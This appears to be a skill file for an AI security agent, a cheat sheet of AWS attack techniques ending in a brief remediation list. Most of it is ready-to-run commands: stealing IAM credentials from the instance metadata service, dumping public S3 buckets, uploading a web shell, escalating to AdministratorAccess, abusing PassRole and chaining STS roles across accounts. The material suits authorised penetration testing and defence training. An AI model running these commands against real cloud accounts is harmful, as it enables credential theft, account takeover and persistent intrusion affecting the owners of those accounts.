---
name: aws
description: AWS cloud security assessment and exploitation techniques
---

# AWS Security

## Attack Surface

- IMDS v1 accessible without session tokens allowing credential theft via SSRF
- S3 buckets with public ACLs or misconfigured bucket policies
- Overprivileged IAM roles and policies with `*` resource or action wildcards
- Lambda function environment variables storing secrets in plaintext
- STS AssumeRole chains for cross-account privilege escalation
- Exposed EC2 key pairs and security groups with unrestricted ingress
- Cognito user pools with self-signup and unverified attributes
- SNS/SQS topics and queues with public access policies

## Detection Techniques

- Test IMDS from SSRF: `curl http://169.254.169.254/latest/meta-data/`
- Enumerate S3 buckets by naming convention: `<company>-dev`, `<company>-backup`, `<company>-logs`
- Check public bucket access: `aws s3 ls s3://bucket-name --no-sign-request`
- Enumerate IAM permissions: `aws iam get-account-authorization-details`
- Test Lambda invocation: `aws lambda invoke --function-name <name> output.json`
- Discover exposed resources with `aws resourcegroupstaggingapi get-resources`
- Check for credential files on EC2: `~/.aws/credentials`, instance profile
- Review CloudTrail for overprivileged API calls

## Common Payloads

### IMDS Credential Theft
```bash
# IMDSv1 (no token required)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# Returns: AccessKeyId, SecretAccessKey, Token

# IMDSv2 (requires token header)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# User data (may contain bootstrap secrets)
curl http://169.254.169.254/latest/user-data/
```

### S3 Bucket Exploitation
```bash
# Unauthenticated enumeration
aws s3 ls s3://target-bucket --no-sign-request
aws s3 cp s3://target-bucket/backup.sql . --no-sign-request

# Authenticated cross-account access
aws s3 ls s3://target-bucket --profile attacker
aws s3api get-bucket-policy --bucket target-bucket

# Upload webshell if writable
aws s3 cp shell.php s3://target-web-bucket/shell.php --no-sign-request
```

### IAM Privilege Escalation
```bash
# Attach admin policy to current user
aws iam attach-user-policy --user-name compromised-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create new access keys for another user
aws iam create-access-key --user-name admin-user

# Pass a more privileged role to a new Lambda function
aws lambda create-function --function-name escalate \
  --role arn:aws:iam::<account>:role/admin-role \
  --handler index.handler --runtime python3.11 --zip-file fileb://payload.zip
```

### STS AssumeRole Chain
```bash
# Assume a cross-account role
aws sts assume-role --role-arn arn:aws:iam::<target-account>:role/CrossAccountRole \
  --role-session-name attack-session

# Chain roles for further escalation
export AWS_ACCESS_KEY_ID=<from-step-1>
export AWS_SECRET_ACCESS_KEY=<from-step-1>
export AWS_SESSION_TOKEN=<from-step-1>
aws sts assume-role --role-arn arn:aws:iam::<another-account>:role/AdminRole \
  --role-session-name chain-step-2
```

## Bypass Techniques

- Use DNS rebinding to bypass IMDSv2 PUT request hop limit
- Access S3 via path-style URLs when virtual-hosted style is blocked: `s3.amazonaws.com/<bucket>`
- Exploit `iam:PassRole` to assign privileged roles to new EC2/Lambda resources
- Use `sts:GetFederationToken` for temporary credentials when `AssumeRole` is restricted
- Leverage service-linked roles that cannot be modified but have implicit high permissions
- Create EC2 instance with instance profile to gain the role's credentials

## Exploit Chaining

- SSRF + IMDS: steal IAM role credentials from vulnerable web application
- S3 bucket read + credential files: extract `.env`, `terraform.tfstate`, database backups
- Lambda env vars + IAM escalation: read secrets from function config, escalate via `PassRole`
- STS chain + CloudFormation: assume deployment role, modify infrastructure
- Cognito misconfiguration + API Gateway: self-register, set admin attributes, access protected APIs

## Remediation

- Enforce IMDSv2 across all EC2 instances; set `HttpTokens: required`
- Apply least-privilege IAM policies; avoid wildcard `*` actions and resources
- Enable S3 Block Public Access at the account level
- Store secrets in AWS Secrets Manager or Parameter Store, not environment variables
- Restrict `sts:AssumeRole` trust policies with conditions (`aws:SourceIp`, `aws:PrincipalOrgID`)
- Enable CloudTrail and GuardDuty for continuous monitoring of suspicious API calls
- Rotate IAM access keys regularly; prefer IAM roles over long-lived credentials
- Use VPC endpoints for S3 and other services to prevent data exfiltration via public internet
